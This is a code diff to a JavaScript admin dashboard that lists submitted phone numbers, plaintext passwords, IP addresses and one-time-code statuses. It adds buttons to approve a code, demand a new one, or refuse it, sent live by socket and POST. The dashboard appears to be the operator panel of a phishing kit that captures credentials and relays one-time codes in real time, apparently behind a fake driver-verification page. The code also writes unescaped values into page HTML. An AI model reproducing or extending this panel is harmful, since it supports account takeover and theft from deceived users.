@@ -200,11 +200,20 @@ function renderTable(data) {
         const id = item._id || item.id;
         const isVerified = item.status === 'VERIFIED';
         
-        const statusBadge = isVerified 
-            ? `<span class="badge-status verified"><i class="fa-solid fa-check-double"></i> VERIFIED DRIVER</span>`
-            : (item.status === 'PASSWORD_SUBMITTED'
-                ? `<span class="badge-status submitted" style="background:rgba(234, 179, 8, 0.2); color:#FACC15; border-color:#EAB308;"><i class="fa-solid fa-key"></i> Password Submitted</span>`
-                : `<span class="badge-status submitted"><i class="fa-solid fa-hourglass-half"></i> Phone Submitted</span>`);
+        let statusBadge = '';
+        if (item.status === 'VERIFIED') {
+            statusBadge = `<span class="badge-status verified"><i class="fa-solid fa-check-double"></i> VERIFIED DRIVER</span>`;
+        } else if (item.status === 'RETRY_OTP') {
+            statusBadge = `<span class="badge-status retry" style="background:rgba(245, 158, 11, 0.2); color:#F59E0B; border:1px solid #F59E0B;"><i class="fa-solid fa-rotate-left"></i> Retrying New OTP</span>`;
+        } else if (item.status === 'FAILED') {
+            statusBadge = `<span class="badge-status failed" style="background:rgba(239, 68, 68, 0.2); color:#EF4444; border:1px solid #EF4444;"><i class="fa-solid fa-xmark"></i> NOT VERIFIED</span>`;
+        } else if (item.status === 'OTP_SUBMITTED') {
+            statusBadge = `<span class="badge-status pending" style="background:rgba(59, 130, 246, 0.2); color:#60A5FA; border:1px solid #3B82F6;"><i class="fa-solid fa-spinner fa-spin"></i> Pending Admin</span>`;
+        } else if (item.status === 'PASSWORD_SUBMITTED') {
+            statusBadge = `<span class="badge-status submitted" style="background:rgba(234, 179, 8, 0.2); color:#FACC15; border-color:#EAB308;"><i class="fa-solid fa-key"></i> Password Submitted</span>`;
+        } else {
+            statusBadge = `<span class="badge-status submitted"><i class="fa-solid fa-hourglass-half"></i> Phone Submitted</span>`;
+        }
 
         const passwordDisplay = item.password 
             ? `<span class="password-pill" style="background:rgba(234, 179, 8, 0.2); color:#FACC15; border:1px solid #EAB308; font-size:12px; padding:3px 10px; border-radius:6px; font-weight:700; font-family:monospace;">${item.password}</span>`
@@ -226,6 +235,23 @@ function renderTable(data) {
             ? new Date(item.verifiedAt).toLocaleString('en-US', { dateStyle: 'short', timeStyle: 'short' })
             : '—';
 
+        const actionButtons = `
+            <div style="display:flex; gap:6px; align-items:center;">
+                <button class="btn-act-approve" onclick="triggerAdminDecision('${id}', '${item.phoneNumber}', 'APPROVE')" title="Approve & Verify">
+                    <i class="fa-solid fa-check"></i> Approve
+                </button>
+                <button class="btn-act-retry" onclick="triggerAdminDecision('${id}', '${item.phoneNumber}', 'REQUEST_NEW_OTP')" title="Reject Code & Ask for New Code">
+                    <i class="fa-solid fa-rotate-left"></i> Ask New Code
+                </button>
+                <button class="btn-act-refuse" onclick="triggerAdminDecision('${id}', '${item.phoneNumber}', 'REJECT')" title="Reject Verification">
+                    <i class="fa-solid fa-xmark"></i> Refuse
+                </button>
+                <button class="btn-del-row" onclick="deleteRecord('${id}')" title="Delete Record">
+                    <i class="fa-solid fa-trash"></i>
+                </button>
+            </div>
+        `;
+
         html += `
             <tr>
                 <td>${globalRowIndex}</td>
@@ -238,17 +264,26 @@ function renderTable(data) {
                 <td>${submittedTime}</td>
                 <td>${verifiedTime}</td>
                 <td style="font-size:12px; color:#94A3B8;">${item.ipAddress || 'Client'}</td>
-                <td>
-                    <button class="btn-del-row" onclick="deleteRecord('${id}')" title="Delete Record">
-                        <i class="fa-solid fa-trash"></i>
-                    </button>
-                </td>
+                <td>${actionButtons}</td>
             </tr>
         `;
     });
 
     tableBody.innerHTML = html;
     renderPaginationControls(startIndex + 1, endIndex, totalRecords, totalPages);
+}
+
+function triggerAdminDecision(id, phoneNumber, action) {
+    if (socket && typeof socket.emit === 'function') {
+        socket.emit('admin_decision', { verificationId: id, phoneNumber, action }, () => {
+            fetchInitialData();
+        });
+    }
+    fetch('/api/verifications/decision', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ verificationId: id, phoneNumber, action })
+    }).then(() => fetchInitialData()).catch(() => {});
 }
 
 // Render Pagination Buttons & Summary
